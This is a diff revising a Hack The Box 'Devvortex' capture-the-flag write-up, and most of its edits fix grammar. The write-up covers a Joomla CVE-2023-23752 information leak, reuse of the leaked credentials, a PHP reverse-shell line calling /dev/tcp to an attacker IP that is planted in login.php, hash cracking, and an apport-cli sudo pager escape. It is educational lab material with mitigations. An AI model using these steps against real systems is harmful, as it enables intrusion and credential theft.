@@ -14,15 +14,15 @@ featured: false
 ---
 
 # Introduction
-Devvortex is a easy Linux box. It involves enumerating a domain to reveal a Content Management System called *Joomla*.
+Devvortex is an easy Linux box. It involves enumerating a domain to reveal a Content Management System called *Joomla*.
 
-An exploit is then used to perform an **Unauthenticated information disclosure.**
+An exploit is then used to perform an **Unauthenticated Information Disclosure.**
 
-This results in obtaining MySQL credentials which were **re-used** to authenticate to the Joomla admin panel.
+This results in stealing MySQL credentials which are **re-used** to authenticate to the Joomla admin panel.
 
-From there a reverse shell is obtained by modifying the `login.php`. Once the reverse shell is established the MySQL database is enumerated  to obtain two hashes. Once a hash is creacked, SSH is used to log on.
+From there a reverse shell is obtained by modifying the `login.php`. Once the reverse shell is established the MySQL database is enumerated  to obtain two hashes. Once a hash is cracked, SSH is used to log on.
 
-**Privilege escalation** is achieved by exploiting a vulnerability in the `apport-cli` utility, which the user has `sudo` rights to. This ultimately spawns an elevated shell.
+**Privilege escalation** is achieved by exploiting a vulnerability in the `apport-cli` utility, which the user has `sudo` rights over. This ultimately spawns a privileged shell.
 
 ## Methods
 
@@ -31,21 +31,21 @@ Unauthenticated Information Disclosure refers to a security vulnerability where 
 
 This type of vulnerability often arises due to misconfigurations or flawed programming in web applications or services. It poses a significant risk because it can lead to data breaches and further exploitation.
 
-In this case, an outdate Joomla version was exploited to obtain clear-text credentials.
+In this case, an outdated Joomla version was exploited to obtain clear-text credentials.
 
 >**Mitigation:** Ensure sensitive information is not vulnerable to unauthenticated disclosure,  keep systems patched, and encrypt sensitive data.
 
 ### Credential stuffing
 Credential stuffing is a type of attack where stolen account credentials (usernames or email addresses and passwords) from one breach are used to attempt access to accounts on other websites. This attack relies on the fact that many people reuse the same login credentials across multiple sites.  It's a widespread method for gaining unauthorised access due to the commonality of password reuse.
 
-In this case, the credentials form the information disclosure were re-used to obtain access to the Joomla administrator panel.
+In this case, the credentials from the information disclosure were re-used to obtain access to the Joomla administrator panel.
 
 > **Mitigation:** Ensure passwords are not re-used across different services.
 
 ### Password cracking
 Password cracking is the process of attempting to gain unauthorised access to restricted systems by figuring out the password. It often involves the use of software that employs various methods (like brute-force attacks, dictionary attacks, or rainbow table attacks) to guess passwords. This technique can be used against individual accounts or to decrypt encrypted data. The complexity and time it takes to crack a password can vary significantly based on the password's strength and the method used.
 
-In this case, the hashes obtained from the MySQL database were cracked with `hashcat`.
+In this case, the hashes stolen from the MySQL database were cracked with `hashcat`.
 
 **Mitigation:** Ensure complex passwords are used.
 
@@ -123,7 +123,7 @@ Filtered Requests: 19965
 Requests/sec.: 0
 ```
 
-This was also added  to `/etc/hosts` to allow the site to be browsed.
+This is added  to `/etc/hosts` to allow the site to be browsed.
 
 ```bash
 ┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/scans]
@@ -164,21 +164,20 @@ Joomla is a popular, open-source Content Management System (CMS) used to build, 
 
 ## Joomla compromise
 
-Checking the subdomain's README.txt file reveals the Joomla version as 4.2
+Checking the subdomain's README.txt file reveals the Joomla version as 4.2.
 
 A quick search of `searchsploit` and we find a promising exploit.
 
 <img src="/assets/img/20240115-devvortext-joomlaexploit.png" alt="20240115-devvortext-joomlaexploit.png" class="auto-resize">
 
-Using the `mirror` command the exploit can be copied to a working directory
+Using the `mirror` command the exploit can be copied to a working directory.
 
 ```bash
 ┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/exploits]
 └─$ searchsploit -m exploits/php/webapps/51334.py
 ```
 
-This exploit ran into some library issues so  another version on GitHub was used:
-- https://github.com/svaltheim/CVE-2023-23752/blob/main/CVE-2023-23752
+This exploit ran into some library issues so  another version on GitHub was used: https://github.com/svaltheim/CVE-2023-23752/blob/main/CVE-2023-23752
 
 The exploit executed successfully and identified two users, site details and database information including credentials.
 
@@ -207,7 +206,7 @@ DB encryption 0
 
 ```
 
-Password stuffing Lewis'  credentials on the `/administrator` page resulted in a successful authentication.
+Password stuffing Lewis' credentials on the `/administrator` page resulted in a successful authentication.
 
 Checking SSH with Lewis' credentials revealed no further credential re-use.
 
@@ -221,13 +220,13 @@ lewis@10.129.15.24's password:
 
 ## Foothold - PHP reverse shell
 
-On the admin panel is a warning about the server using an outdated version of PHP
+On the admin panel is a warning about the server using an outdated version of PHP.
 
 <img src="/assets/img/20240115-devvortext-phpwarning.png" alt="20240115-devvortext-phpwarning.png" class="auto-resize">
 
-Moving to `/System/Templates/Administrator Templates`, we can see we have access to the PHP templates. Lets edit the `login.php` to send a reverse shell when the page is called.
+Moving to `/System/Templates/Administrator Templates`, it was identified that the user has access to the PHP templates. The `login.php` was edited to send a reverse shell when the page is served.
 
-The modification we will make is:
+The modification made was:
 
 ```php
 <?php
@@ -235,7 +234,7 @@ system('bash -c "bash -i >& /dev/tcp/10.10.14.16/4321 00>&1"');
 <SNIP>
 ```
 
-- **`system()` Function in PHP**: This is a PHP function that is used to execute an external program. The `system` function will execute the given command and output the result. In this context, it is being used to execute a bash command.
+- `system()` *Function in PHP*: This is a PHP function that is used to execute an external program. The `system` function will execute the given command and output the result. In this context, it is being used to execute a bash command.
 - `bash -c`: This tells the system to execute the following string with Bash.
 - `"bash -i >& /dev/tcp/10.10.14.16/4321 0<&1"`: This is the string command that Bash executes.
 - `bash -i`: This starts an interactive Bash shell (`-i` flag for interactive).
@@ -246,7 +245,7 @@ system('bash -c "bash -i >& /dev/tcp/10.10.14.16/4321 00>&1"');
 
 <img src="/assets/img/20240115-devvortext-revshell.png" alt="20240115-devvortext-revshell.png" class="auto-resize">
 
-Starting a netcat listener and then navigating back to http://dev.devortex.htb/administrator in a private window returns as a webshell.
+Starting a netcat listener and then navigating back to http://dev.devortex.htb/administrator in a private window returns as a reverse shell.
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -298,7 +297,7 @@ The sequence of commands will upgrade a basic shell into a fully interactive she
 
 ## Lateral movement - MySQL
 
-Recall the credentials  found with the Joomla exploit earlier:
+Recall the credentials found with the Joomla exploit earlier:
 
 ```
 Database info
@@ -311,7 +310,7 @@ DB prefix: sd4fg_
 DB encryption 0
 ```
 
-Lets try them on the shell.
+Trying them on the reverse shell is successful.
 
 ```mysql
 mysql -h localhost -u lewis -p '<REDACTED>'
@@ -372,13 +371,13 @@ mysql> select * from sd4fg_users;
 
 ```
 
-As we can see, we have obtained to hashed passwords from the database
+As shown above, two hashes were stolen from the database.
 
 <img src="/assets/img/20240115-devvortext-sqlhashes.png" alt="20240115-devvortext-sqlhashes.png" class="auto-resize">
 
 ## Cracking the passwords
 
-Using Hashcat, we can quickly crack a password.
+Using Hashcat, one of the hashes is quickly cracked.
 
 ```bash
 ──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/credentials]
@@ -445,7 +444,7 @@ Grab the first flag!
 
 # Privilege escalation
 
-Using `sudo -l` we can list the commands the user can run with root privileges.
+Using `sudo -l` lists the binaries `logan` can run with root privileges.
 
 ```bash
 logan@devvortex:~$ sudo -l
@@ -457,7 +456,8 @@ User logan may run the following commands on devvortex:
 
 ```
 
-We can see here that `logan` can run `/usr/bin/apport-cli`
+We can see here that `logan` can run `/usr/bin/apport-cli`.
+
 ## What is apport-cli
 
 `apport-cli` is a command-line interface tool for Apport, which is a system in Ubuntu and other Debian-based Linux distributions used for reporting bugs and crashes. Apport automatically generates crash reports when a program fails and helps in debugging the causes of those failures. These reports can include details like the state of the program at the time of the crash, which can be invaluable for developers to diagnose and fix issues.
@@ -466,7 +466,7 @@ A key feature of the utility is a **Command-Line Interface**. As a CLI tool, `ap
 
 ## Exploiting apport-cli
 
-We can see in the help menu that there are a number of options.
+The help menu reveals a number of options.
 
 ```bash
 Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]
@@ -507,19 +507,17 @@ Options:
 
 ```
 
-Lets first try submitting a bug to understand how the utility works.
+With `sudo /usr/bin/apport-cli -f` the utility enters the **File a bug** mode to first attempt submitting a bug to understand how the utility works.
 
-With `sudo /usr/bin/apport-cli -f` the utility enters the **File a bug** mode.
-
-At the end, we have the option to view the report.
+At the end, of the submission is an option to view the report.
 
 <img src="/assets/img/20240115-devvortext-apportuse.png" alt="20240115-devvortext-apportuse.png" class="auto-resize">
 
-We can see in next screen that it opens in a `vim` style editor.
+The screen that follows opens in a `vim` style editor.
 
 <img src="/assets/img/20240115-devvortext-apportshell.png" alt="20240115-devvortext-apportshell.png" class="auto-resize">
 
-If we try to pass a shell to it by typing `!/bin/bash` it would theoretically launch under the sudo privileges from which the utility is being ran.
+Passing a shell to it by typing `!/bin/bash` may, theoretically, launch a new shell under the sudo privileges from which the utility is being ran.
 
 and it does!
 
